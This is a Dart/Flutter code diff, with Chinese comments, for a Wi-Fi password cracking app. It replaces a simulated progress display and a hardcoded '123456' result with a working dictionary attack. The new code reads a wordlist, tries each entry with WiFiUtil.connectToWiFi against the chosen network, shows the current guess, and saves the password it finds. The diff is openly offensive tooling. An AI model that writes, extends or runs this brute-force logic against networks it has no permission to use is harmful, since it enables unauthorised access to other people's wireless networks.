@@ -25,6 +25,8 @@ class _HomePageState extends State<HomePage> {
   bool _isLocked = false;
   bool _isScanning = false; // 添加扫描状态跟踪
   bool _hasSelectedWifi = false; // 添加是否有选中WiFi的状态
+  int _currentCrackLine = 0; // 添加当前破解行数变量
+  String _currentPassword = ""; // 添加当前匹配密码变量
 
   // 初始化为空列表，在应用启动后自动扫描
   List<WiFiNetwork> _wifiList = [];
@@ -411,80 +413,153 @@ class _HomePageState extends State<HomePage> {
     }
   }
 
-  void _toggleCracking() {
+  // 修改开始破解WiFi方法
+  Future<void> _startCrackWifi(WiFiNetwork network) async {
+    if (_isLocked && network.name != _crackingStatus.wifiName) {
+      ToastUtil.show(context, "当前WiFi已锁定，请先解锁", ToastType.warning);
+      return;
+    }
+
+    // 检查WiFi是否启用
+    bool isEnabled = await WiFiForIoTPlugin.isEnabled();
+    if (!isEnabled) {
+      ToastUtil.show(context, "请开启WiFi以扫描网络", ToastType.warning);
+      return;
+    }
+
+    // 先选中该WiFi
+    setState(() {
+      for (var wifi in _wifiList) {
+        wifi.isSelected = wifi.name == network.name;
+      }
+
+      // 更新破解状态
+      _crackingStatus = CrackingStatus(
+        wifiName: network.name,
+        dictionaryName: _crackingStatus.dictionaryName,
+        dictionarySize: _crackingStatus.dictionarySize,
+        estimatedTime: "计算中...",
+        currentProgress: "准备中...",
+        progressPercent: 0.0,
+      );
+
+      _hasSelectedWifi = true;
+      _isCracking = true;
+      _currentCrackLine = 0; // 重置当前行数
+      _currentPassword = ""; // 重置当前密码
+    });
+
+    await _continueCracking(network);
+  }
+
+  // 添加继续破解方法
+  Future<void> _continueCracking(WiFiNetwork network) async {
+    try {
+      // 获取字典路径
+      final dictionaryPath = await FileUtil.getDictionaryPath();
+      final dictionaryFile =
+          File('$dictionaryPath/${_crackingStatus.dictionaryName}');
+
+      if (!await dictionaryFile.exists()) {
+        ToastUtil.show(context, "字典文件不存在", ToastType.error);
+        return;
+      }
+
+      // 获取字典总行数
+      final totalLines = await dictionaryFile.readAsLines();
+      final totalCount = totalLines.length;
+
+      // 更新状态显示总行数
+      setState(() {
+        _crackingStatus = CrackingStatus(
+          wifiName: network.name,
+          dictionaryName: _crackingStatus.dictionaryName,
+          dictionarySize: _crackingStatus.dictionarySize,
+          estimatedTime: _calculateEstimatedTime(totalCount, _currentCrackLine),
+          currentProgress: "第$_currentCrackLine行/共$totalCount行",
+          progressPercent: _currentCrackLine / totalCount,
+        );
+      });
+
+      // 从当前行开始读取字典并尝试连接
+      for (int i = _currentCrackLine; i < totalCount; i++) {
+        if (!_isCracking) break; // 如果破解被暂停，退出循环
+
+        _currentCrackLine = i;
+        final password = totalLines[i].trim();
+        _currentPassword = password; // 更新当前密码
+
+        // 更新进度
+        setState(() {
+          _crackingStatus = CrackingStatus(
+            wifiName: network.name,
+            dictionaryName: _crackingStatus.dictionaryName,
+            dictionarySize: _crackingStatus.dictionarySize,
+            estimatedTime:
+                _calculateEstimatedTime(totalCount, _currentCrackLine),
+            currentProgress: "第$_currentCrackLine行/共$totalCount行",
+            progressPercent: _currentCrackLine / totalCount,
+          );
+        });
+
+        // 尝试连接
+        bool success = await WiFiUtil.connectToWiFi(network.name, password);
+
+        if (success) {
+          // 连接成功，保存结果
+          _saveWiFiCrackResult(network, password);
+          ToastUtil.show(context, "破解成功！密码: $password", ToastType.success);
+          setState(() {
+            _isCracking = false;
+            _currentPassword = ""; // 清空当前密码
+          });
+          return;
+        }
+
+        // 添加延迟以避免过快尝试
+        await Future.delayed(const Duration(milliseconds: 100));
+      }
+
+      // 如果遍历完所有密码都没有成功
+      ToastUtil.show(context, "未找到正确的密码", ToastType.error);
+      setState(() {
+        _isCracking = false;
+        _currentPassword = ""; // 清空当前密码
+      });
+    } catch (e) {
+      print('破解过程出错: $e');
+      ToastUtil.show(context, "破解过程出错: $e", ToastType.error);
+      setState(() {
+        _isCracking = false;
+        _currentPassword = ""; // 清空当前密码
+      });
+    }
+  }
+
+  // 修改破解控制方法
+  void _toggleCracking() async {
     if (!_hasSelectedWifi) {
       ToastUtil.show(context, "请先选择一个WiFi网络", ToastType.warning);
       return;
     }
 
+    // 检查WiFi是否启用
+    bool isEnabled = await WiFiForIoTPlugin.isEnabled();
+    if (!isEnabled) {
+      ToastUtil.show(context, "请开启WiFi以扫描网络", ToastType.warning);
+      return;
+    }
+
+    // 找到选中的WiFi
+    final selectedWiFi = _wifiList.firstWhere((wifi) => wifi.isSelected);
+
     setState(() {
       _isCracking = !_isCracking;
       if (_isCracking) {
-        _startCrackingSimulation();
+        _continueCracking(selectedWiFi);
       }
     });
-    ToastUtil.show(context, _isCracking ? "开始破解..." : "已暂停破解");
-  }
-
-  void _startCrackingSimulation() {
-    // 模拟破解进度
-    Future.delayed(const Duration(milliseconds: 500), () {
-      if (!_isCracking) return;
-      setState(() {
-        _crackingStatus = CrackingStatus(
-          wifiName: _crackingStatus.wifiName,
-          dictionaryName: _crackingStatus.dictionaryName,
-          dictionarySize: _crackingStatus.dictionarySize,
-          progressPercent: _crackingStatus.progressPercent + 0.01,
-          estimatedTime:
-              _updateEstimatedTime(_crackingStatus.progressPercent + 0.01),
-          currentProgress:
-              _updateProgress(_crackingStatus.progressPercent + 0.01),
-        );
-
-        if (_crackingStatus.progressPercent >= 1.0) {
-          _crackingStatus = CrackingStatus(
-            wifiName: _crackingStatus.wifiName,
-            dictionaryName: _crackingStatus.dictionaryName,
-            dictionarySize: _crackingStatus.dictionarySize,
-            progressPercent: 1.0,
-            estimatedTime: "完成",
-            currentProgress: "完成",
-          );
-          _isCracking = false;
-          ToastUtil.show(context, "WiFi密码破解成功：123456", ToastType.success);
-
-          // 找到选中的WiFi网络
-          final selectedWiFi = _wifiList.firstWhere((wifi) => wifi.isSelected,
-              orElse: () => _wifiList.first);
-
-          // 保存破解结果
-          _saveWiFiCrackResult(selectedWiFi, "123456");
-          return;
-        }
-
-        _startCrackingSimulation();
-      });
-    });
-  }
-
-  String _updateEstimatedTime(double progress) {
-    // 更新预计时间
-    int remainingMinutes = ((1.0 - progress) * 150).floor();
-    if (remainingMinutes > 60) {
-      int hours = remainingMinutes ~/ 60;
-      int minutes = remainingMinutes % 60;
-      return "$hours小时$minutes分钟";
-    } else {
-      return "$remainingMinutes分钟";
-    }
-  }
-
-  String _updateProgress(double progress) {
-    // 更新进度信息
-    int total = 10000;
-    int current = (total * progress).floor();
-    return "第$current行/共$total行";
+    ToastUtil.show(context, _isCracking ? "继续破解..." : "已暂停破解");
   }
 
   void _toggleLock() {
@@ -523,37 +598,22 @@ class _HomePageState extends State<HomePage> {
     ToastUtil.show(context, "已选择WiFi: ${network.name}");
   }
 
-  // 开始破解WiFi
-  void _startCrackWifi(WiFiNetwork network) {
-    if (_isLocked && network.name != _crackingStatus.wifiName) {
-      ToastUtil.show(context, "当前WiFi已锁定，请先解锁", ToastType.warning);
-      return;
+  // 计算预计剩余时间
+  String _calculateEstimatedTime(int totalLines, int currentLine) {
+    int remainingLines = totalLines - currentLine;
+    int remainingSeconds = remainingLines * 15; // 每行15秒
+
+    if (remainingSeconds > 3600) {
+      int hours = remainingSeconds ~/ 3600;
+      int minutes = (remainingSeconds % 3600) ~/ 60;
+      return "$hours小时$minutes分钟";
+    } else if (remainingSeconds > 60) {
+      int minutes = remainingSeconds ~/ 60;
+      int seconds = remainingSeconds % 60;
+      return "$minutes分钟$seconds秒";
+    } else {
+      return "$remainingSeconds秒";
     }
-
-    // 先选中该WiFi
-    setState(() {
-      for (var wifi in _wifiList) {
-        wifi.isSelected = wifi.name == network.name;
-      }
-
-      // 更新破解状态
-      _crackingStatus = CrackingStatus(
-        wifiName: network.name,
-        dictionaryName: _crackingStatus.dictionaryName,
-        dictionarySize: _crackingStatus.dictionarySize,
-        estimatedTime: "计算中...",
-        currentProgress: "准备中...",
-        progressPercent: 0.0,
-      );
-
-      _hasSelectedWifi = true; // 设置为已选中WiFi
-
-      // 自动开始破解
-      _isCracking = true;
-    });
-
-    ToastUtil.show(context, "开始破解WiFi: ${network.name}");
-    _startCrackingSimulation();
   }
 
   // 修改选择字典的方法，弹出底部抽屉
@@ -871,6 +931,27 @@ class _HomePageState extends State<HomePage> {
                     ),
                     overflow: TextOverflow.ellipsis,
                   ),
+                  if (_isCracking && _currentPassword.isNotEmpty)
+                    const SizedBox(height: 8),
+                  RichText(
+                    text: TextSpan(
+                      style: DefaultTextStyle.of(context).style,
+                      children: [
+                        const TextSpan(
+                          text: '当前密码: ',
+                          style: TextStyle(fontWeight: FontWeight.bold),
+                        ),
+                        TextSpan(
+                          text: _currentPassword,
+                          style: TextStyle(
+                            color: AppColors.primary,
+                            fontFamily: 'monospace',
+                          ),
+                        ),
+                      ],
+                    ),
+                    overflow: TextOverflow.ellipsis,
+                  ),
                   const SizedBox(height: 8),
                   RichText(
                     text: TextSpan(
@@ -1178,16 +1259,20 @@ class _HomePageState extends State<HomePage> {
                       const SizedBox(width: 8),
                       // 添加破解按钮
                       ElevatedButton.icon(
-                        onPressed: () => _startCrackWifi(wifi),
-                        icon: Icon(AppIcons.key, size: 16),
+                        onPressed: () {
+                          _startCrackWifi(wifi);
+                          _toggleLock(); // 自动锁定
+                        },
+                        icon: Icon(AppIcons.key, size: 16, color: Colors.white),
                         label: const Text('破解'),
                         style: ElevatedButton.styleFrom(
                           backgroundColor:
                               Theme.of(context).colorScheme.primary,
                           foregroundColor: Colors.white,
                           padding: const EdgeInsets.symmetric(
-                              horizontal: 8, vertical: 4),
-                          minimumSize: const Size(20, 32),
+                              horizontal: 12, vertical: 8),
+                          minimumSize: const Size(60, 32),
+                          alignment: Alignment.center,
                         ),
                       ),
                     ],
